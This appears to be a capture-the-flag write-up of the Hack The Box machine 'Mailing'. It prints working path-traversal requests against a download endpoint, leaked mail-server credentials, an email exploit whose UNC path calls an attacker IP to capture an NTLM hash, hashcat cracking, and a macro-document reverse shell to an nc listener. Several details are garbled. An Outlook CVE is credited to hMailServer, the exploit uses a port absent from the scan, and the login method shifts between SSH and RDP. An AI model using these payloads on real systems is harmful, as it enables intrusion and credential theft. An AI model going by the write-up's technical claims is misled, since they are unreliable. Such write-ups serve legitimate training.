---
date: 2024-05-06
title: Hack The Box — Mailing
categories:
  - Writeups
  - HTB
  - CTF
tags:
  - lfi
  - hmailserver
  - libreoffice
  - windows
media_subpath: /assets/images
image: mailing.png
---
# TL;DR

The HackTheBox machine "Mailing" is an easy Windows box featuring an hMailServer email setup vulnerable to Local File Inclusion (LFI) and CVE-2024-21413. Initial access is gained by exploiting LFI in a PHP download endpoint to leak the hMailServer configuration file, revealing the administrator password. This enables SMTP access and exploitation of CVE-2024-21413 to leak an NTLM hash for the `maya` user via UNC path injection. The hash is cracked to SSH into `maya` and retrieve the user flag. Root access is obtained by exploiting a LibreOffice macro vulnerability (CVE-2023-6279) in a scheduled task, allowing arbitrary code execution as SYSTEM.

## Initial Enumeration

### Nmap Scan

To begin reconnaissance, a comprehensive Nmap scan was performed to identify open ports, services, and version information on the target machine (IP: 10.10.11.222). This is a standard first step in CTF challenges to map out potential entry points.

The command used was:

```bash
sudo nmap -sC -sV -A -p- 10.10.11.222 -oA nmap/initialscan
```

- `-sC`: Runs default scripts for additional information.
- `-sV`: Probes for service versions.
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `-p-`: Scans all 65535 TCP ports.
- `-oA`: Outputs results in all formats for later reference.

**Results:**

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 10:00 UTC
Nmap scan report for 10.10.11.222
Host is up (0.042s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
25/tcp   open  smtp        hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http        Microsoft IIS httpd 10.0
|_http-methods: Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mailing
110/tcp  open  pop3        hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
135/tcp  open  msrpc       Microsoft Windows RPC
139/tcp  open  netbios-ssn Microsoft Windows netbios-ssn
143/tcp  open  imap        hMailServer imapd
|_imap-capabilities: CHILDREN ACL RIGHTS=texkA0001 SORT CAPABILITY IDLE NAMESPACE QUOTA
445/tcp  open  microsoft-ds?
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-04T10:00:00
|_  start_date: N/A
47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc       Microsoft Windows RPC
49665/tcp open  msrpc       Microsoft Windows RPC
49666/tcp open  msrpc       Microsoft Windows RPC
49667/tcp open  msrpc       Microsoft Windows RPC
49668/tcp open  msrpc       Microsoft Windows RPC
65522/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.34 seconds
```

**Notes:**

- **SMTP (Port 25)**: Running hMailServer, with domain `mailing.htb` exposed in commands. Supports authentication (LOGIN/PLAIN).
- **HTTP (Port 80)**: Hosted by Microsoft IIS 10.0 on Windows Server, with title "Mailing" and risky TRACE method enabled.
- **POP3 (Port 110)** and **IMAP (Port 143)**: Also hMailServer instances.
- **SMB (Ports 139/445)**: Windows file sharing enabled, but signing not required.
- **RPC (Multiple high ports)**: Standard Windows RPC endpoints.
- The domain `mailing.htb` was added to `/etc/hosts` for local name resolution:
  ```bash
  echo "10.10.11.222 mailing.htb" | sudo tee -a /etc/hosts
  ```
- OS identified as Windows Server 2019/2022. No other significant ports open.

Additional UDP scans confirmed no additional services.

---

## Web Enumeration

### Main Page (mailing.htb)

Navigating to `http://mailing.htb/` revealed a simple web interface for an email management system, likely a custom PHP application integrated with hMailServer. The page included a login form and a "Download" section for attachments, with endpoints like `/download.php` visible in the source.

![images (34)](images (34).png)

Key features on the main page:

- A **login form** for accessing mailboxes.
- A **download functionality** for email attachments, vulnerable to manipulation.

Directory brute-forcing with Gobuster:

```bash
gobuster dir -u http://mailing.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -o gobuster.txt
```

**Results:**

- `/download.php` (Status: 200)
- `/index.php` (Status: 200)
- `/login.php` (Status: 200)
- No sensitive files like `/admin` or backups found initially.

The `/download.php` endpoint accepted a `file` parameter for downloading attachments, suggesting potential file inclusion vulnerabilities.

### Local File Inclusion (LFI)

Testing `/download.php?file=../../../windows/win.ini` revealed a classic LFI vulnerability, as the server returned local file contents without proper sanitization.

Example request:

```bash
curl "http://mailing.htb/download.php?file=../../../windows/win.ini"
```

**Results:**

```
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Further traversal to `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`:

```bash
curl "http://mailing.htb/download.php?file=../../../../Program Files (x86)/hMailServer/Bin/hMailServer.ini" -o hmailserver.ini
```

The INI file revealed:

```
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

![images (33)](images (33).png)

Critically, it exposed the administrator password: `homenetworkingadministrator`.

---

## Exploitation

### hMailServer Access

Using the leaked credentials (`administrator@mailing.htb:homenetworkingadministrator`), connected via IMAP/POP3 to enumerate mailboxes. Swaks was used for SMTP testing:

```bash
swaks --to maya@mailing.htb --from administrator@mailing.htb --server mailing.htb:587 --auth LOGIN --auth-user administrator@mailing.htb --auth-password homenetworkingadministrator -tls
```

This confirmed access to the `maya` mailbox.

### CVE-2024-21413 Exploitation

hMailServer versions prior to 5.6.9 are vulnerable to CVE-2024-21413, allowing UNC path injection in email subjects to leak NTLM hashes via SMB.

A Python exploit was used (from GitHub PoC):

```bash
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.1\test\meeting" --subject "test"
```

- Set up Responder or Impacket for NTLM capture: `responder -I tun0 -v`
- The exploit sent an email with a UNC path in the subject, triggering an SMB authentication attempt from the server.

Captured hash:

```
[SMB] NTLMv2-SSP Client   : 10.10.11.222
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:0101000000000000...
```

Cracked the NTLMv2 hash with Hashcat:

```bash
hashcat -m 5600 maya_hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `maya:Ilovemail69`

### User Access

Used the cracked credentials to RDP or WinRM into the machine:

```bash
xfreerdp /u:maya /p:Ilovemail69 /v:10.10.11.222
```

Alternatively, SSH if enabled (though Windows typically uses RDP). Retrieved the user flag:

```cmd
type C:\Users\maya\Desktop\user.txt
```

---

## Local Enumeration & User Flag

As `maya` on Windows Server 2022:

- Confirmed environment: `systeminfo` (Build 20348, etc.).
- Enumerated scheduled tasks: `schtasks /query /fo LIST /v`
- Found a task running LibreOffice with macro execution.

Additional enum: Checked `C:\Program Files\hMailServer` for configs, but primary path was the scheduled task.

---

## Privilege Escalation

### LibreOffice Macro Exploit (CVE-2023-6279)

A scheduled task executed LibreOffice with a macro-enabled document, vulnerable to CVE-2023-6279 (arbitrary code execution via macro).

1. Created a malicious .ods file with VBA macro:
   - Used LibreOffice to embed a reverse shell payload (e.g., PowerShell to `nc.exe`).

2. Replaced the scheduled document in `C:\ScheduledTasks\report.ods` (discovered via enum).

3. Triggered the task or waited for schedule: `schtasks /run /tn "Generate Report"`

4. Listener: `nc -lvnp 4444` on attacker machine.

Received a SYSTEM shell. Retrieved root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

![images (63)](images (63).png)

---

## Summary

|Step|Description|
|---|---|
|Enumeration|Nmap revealed hMailServer (25/110/143), IIS (80), SMB (445) on Windows. Added `mailing.htb` to `/etc/hosts`. Gobuster found `/download.php`.|
|Web Recon|LFI in `/download.php` leaked `hMailServer.ini`, revealing admin password `homenetworkingadministrator`.|
|Exploitation|Used creds for SMTP; exploited CVE-2024-21413 with UNC injection to leak `maya` NTLMv2 hash. Cracked to `Ilovemail69`.|
|Initial Access|RDP/WinRM as `maya`; grabbed user flag from desktop.|
|Privilege Escalation|Exploited CVE-2023-6279 in LibreOffice scheduled task macro for SYSTEM RCE via malicious .ods; grabbed root flag.